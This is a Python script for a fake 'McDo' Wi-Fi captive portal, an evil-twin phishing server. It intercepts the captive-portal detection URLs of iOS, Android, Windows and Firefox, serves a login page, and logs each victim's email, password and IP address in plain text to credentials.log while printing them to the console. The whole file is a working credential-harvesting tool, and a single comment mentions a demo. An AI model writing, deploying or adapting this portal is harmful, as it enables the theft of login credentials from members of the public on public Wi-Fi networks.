#!/usr/bin/env python3
from http.server import HTTPServer, SimpleHTTPRequestHandler
from urllib.parse import parse_qs
from datetime import datetime
import os

# Se placer dans le dossier du script pour que les fichiers HTML/images soient servis
os.chdir(os.path.dirname(os.path.abspath(__file__)))

class CaptiveHandler(SimpleHTTPRequestHandler):

    def do_POST(self):
        # Lire les données du formulaire
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length).decode('utf-8', errors='ignore')
        params = parse_qs(post_data)

        # Récupérer les credentials (le formulaire utilise "email" et "password")
        email = params.get('email', [''])[0]
        password = params.get('password', [''])[0]

        # Logger dans le fichier credentials.log
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        client_ip = self.client_address[0]
        log_line = f'[{timestamp}] IP: {client_ip} | Email: {email} | Password: {password}\n'

        with open('credentials.log', 'a') as f:
            f.write(log_line)

        # Affichage console bien visible pour la démo
        print('\n' + '='*60)
        print(f'[!] CREDENTIALS CAPTURÉS')
        print(f'    Heure    : {timestamp}')
        print(f'    IP       : {client_ip}')
        print(f'    Email    : {email}')
        print(f'    Password : {password}')
        print('='*60 + '\n')

        # Rediriger vers la page de succès
        self.send_response(302)
        self.send_header('Location', '/success.html')
        self.end_headers()

    def do_GET(self):
        # URLs de détection de portail captif des différents OS
        captive_urls = [
            '/hotspot-detect.html',      # iOS / macOS
            '/generate_204',              # Android
            '/gen_204',                   # Android (ancien)
            '/connecttest.txt',           # Windows
            '/ncsi.txt',                  # Windows (ancien)
            '/canonical.html',            # Firefox
            '/success.txt',               # Firefox (ancien)
            '/library/test/success.html'  # iOS (ancien)
        ]

        # Si c'est une requête de détection → rediriger vers le portail
        if self.path in captive_urls:
            self.send_response(302)
            self.send_header('Location', '/index.html')
            self.end_headers()
            return

        # Si c'est la racine → servir index.html
        if self.path == '/':
            self.path = '/index.html'

        # Sinon servir le fichier normalement (HTML, image, etc.)
        super().do_GET()

    def log_message(self, format, *args):
        # Logs HTTP simplifiés pour garder le terminal lisible
        print(f"[HTTP] {self.client_address[0]} - {format % args}")


if __name__ == '__main__':
    PORT = 80
    print('='*60)
    print(f'[*] Portail captif McDo actif sur le port {PORT}')
    print(f'[*] Credentials enregistrés dans : credentials.log')
    print(f'[*] Appuie sur CTRL+C pour arrêter')
    print('='*60)

    try:
        httpd = HTTPServer(('0.0.0.0', PORT), CaptiveHandler)
        httpd.serve_forever()
    except KeyboardInterrupt:
        print('\n[*] Arrêt du portail captif')
        httpd.server_close()
